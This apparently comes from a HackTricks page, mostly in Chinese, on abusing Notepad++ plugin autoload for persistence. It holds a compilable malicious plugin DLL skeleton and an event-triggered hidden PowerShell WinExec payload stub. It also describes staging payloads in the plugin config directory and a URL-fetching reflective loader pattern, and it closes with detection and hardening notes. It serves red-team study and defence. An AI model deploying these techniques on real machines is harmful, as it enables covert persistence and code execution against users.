# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ 在启动时会**autoload 位于其 `plugins` 子文件夹下的每个 plugin DLL**。将恶意 plugin 放入任何**可写的 Notepad++ installation** 中，都会在 editor 每次启动时在 `notepad++.exe` 内部获得 code execution，可被用于**persistence**、隐蔽的**initial execution**，或者在 editor 以提升权限启动时作为一个**in-process loader**。

自 **Notepad++ 7.6+** 起，预期的手动安装布局是**每个 plugin 一个子文件夹**（`plugins\<PluginName>\<PluginName>.dll`）。在 **portable mode**（`notepad++.exe` 旁存在 `doLocalConf.xml`）下，整个 application tree 会保留在该目录本地，这通常会把被复制的/admin tool bundles 变成一个易于用户可写的 execution surface。

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll`（通常需要 admin 才能写入）。
- 适合低权限 operator 的可写选项：
- 在用户可写的文件夹中使用 **portable Notepad++ build**。
- 将 `C:\Program Files\Notepad++` 复制到用户可控路径（例如 `%LOCALAPPDATA%\npp\`），并从那里运行 `notepad++.exe`。
- 寻找已经包含 `doLocalConf.xml` 且位于 `Program Files` 之外的 **admin tool bundles**、解压后的 zip 副本，或 help-desk toolkits。
- 每个 plugin 都会在 `plugins` 下获得自己的子文件夹，并在启动时自动加载；菜单项会出现在 **Plugins** 下。

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Notepad++ 期望特定的 **exported functions**。这些都会在初始化期间被调用，从而提供多个 execution surfaces：
- **`DllMain`** — 在 DLL load 后立即运行（第一个 execution point）。
- **`setInfo(NppData)`** — 在 load 时调用一次，用于提供 Notepad++ handles；通常用于注册 menu items。
- **`getName()`** — 返回在 menu 中显示的 plugin name。
- **`getFuncsArray(int *nbF)`** — 返回 menu commands；即使为空，也会在 startup 期间被调用。
- **`beNotified(SCNotification*)`** — 接收 Notepad++ / Scintilla events（适合将 payloads 延迟到用户 action 或 editor event 触发时再执行）。
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler，适合更大的 data exchanges。
- **`isUnicode()`** — load 时检查的 compatibility flag。

大多数 exports 都可以实现为 **stubs**；execution 可以从 `DllMain` 或上面的任意 callback 中发生，在 autoload 期间执行。

## Minimal malicious plugin skeleton
编译一个 DLL，包含预期的 exports，并将其放到可写的 Notepad++ folder 下的 `plugins\\MyNewPlugin\\MyNewPlugin.dll`：
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. 构建 DLL (Visual Studio/MinGW)。
2. 在 `plugins` 下创建 plugin 子文件夹，并将 DLL 放入其中。
3. 重启 Notepad++; DLL 会自动加载，执行 `DllMain` 和后续回调。

## 通过 `beNotified` 的低噪声触发模式
为了 OPSEC，很多 payload 不应从 `DllMain` 触发。更安静的模式是让 plugin 正常加载，然后仅在真实的 editor 事件之后执行，例如 **startup complete**、**buffer activation** 或 **first typed character**。
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
这比 noisy 的 `DllMain` beacon 更符合 public offensive research：DLL 仍然会在启动时 autoload，但恶意动作会被延迟，直到 Notepad++ 看起来真的在被使用。

## Using the plugin config directory as secondary storage
Notepad++ 暴露了 `NPPM_GETPLUGINSCONFIGDIR`，它返回 **当前用户的 plugin configuration directory**。恶意 plugin 可以利用这一点，让磁盘上的 DLL 保持最小化，同时把加密的 config、staged payloads 或 tasking files 存放在一个与正常 plugin 状态混在一起的路径中。
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operationally this is useful when you want:
- a tiny autoloaded bootstrap DLL;
- per-user tasking without touching the main plugin binary again;
- to separate the **autoload trigger** from the heavier second stage.

## Reflective loader plugin pattern
A weaponized plugin can turn Notepad++ into a **reflective DLL loader**:
- Present a minimal UI/menu entry (e.g., "LoadDLL").
- Accept a **file path** or **URL** to fetch a payload DLL.
- Reflectively map the DLL into the current process and invoke an exported entry point (e.g., a loader function inside the fetched DLL).
- Benefit: reuse a benign-looking GUI process instead of spawning a new loader; payload inherits the integrity of `notepad++.exe` (including elevated contexts).
- Trade-offs: dropping an **unsigned plugin DLL** to disk is noisy; a practical variation is to use the autoloaded plugin only as a stub and keep the real implant encrypted/staged elsewhere.

## Detection and hardening notes
- Block or monitor **writes to Notepad++ plugin directories** (including portable copies in user profiles); enable controlled folder access or application allowlisting.
- Alert on **new unsigned DLLs** under `plugins`, changes to portable Notepad++ trees, and unusual **child processes/network activity** from `notepad++.exe`.
- Baseline legitimate plugins and investigate any new DLL that exports the normal Notepad++ plugin interface but also spawns shells, PowerShell, or network beacons.
- Enforce plugin installation via **Plugins Admin** only, and restrict execution of portable copies from untrusted paths.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
